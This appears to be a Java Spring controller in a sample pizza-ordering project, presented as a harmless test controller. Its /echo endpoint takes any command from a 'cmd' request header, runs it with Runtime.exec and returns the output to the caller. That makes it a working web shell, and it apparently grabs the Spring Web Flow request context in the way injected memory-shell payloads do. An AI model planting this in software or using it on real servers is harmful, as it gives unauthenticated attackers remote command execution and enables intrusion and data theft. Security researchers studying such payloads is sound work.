package com.pizza;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import java.io.IOException;

@Controller
public class SpringWebFlowTestController {

    @GetMapping("/")
    public String redirectToFlow() {
        return "redirect:/pizza";
    }

    @GetMapping("/echo")
    public String test() throws IOException {

        org.springframework.webflow.context.servlet.ServletExternalContext servletExternalContext = (org.springframework.webflow.context.servlet.ServletExternalContext) org.springframework.webflow.context.ExternalContextHolder.getExternalContext();
        javax.servlet.http.HttpServletRequest request = (javax.servlet.http.HttpServletRequest) servletExternalContext.getNativeRequest();
        javax.servlet.http.HttpServletResponse response = (javax.servlet.http.HttpServletResponse) servletExternalContext.getNativeResponse();

        String cmd = request.getHeader("cmd");
        java.io.BufferedReader br = new java.io.BufferedReader(new java.io.InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));

        StringBuilder sb = new StringBuilder();
        String line;
        while((line = br.readLine()) != null){
            sb.append(line + "\n");
        }

        br.close();
        response.getWriter().println(sb.toString());

        return "test";
    }
}
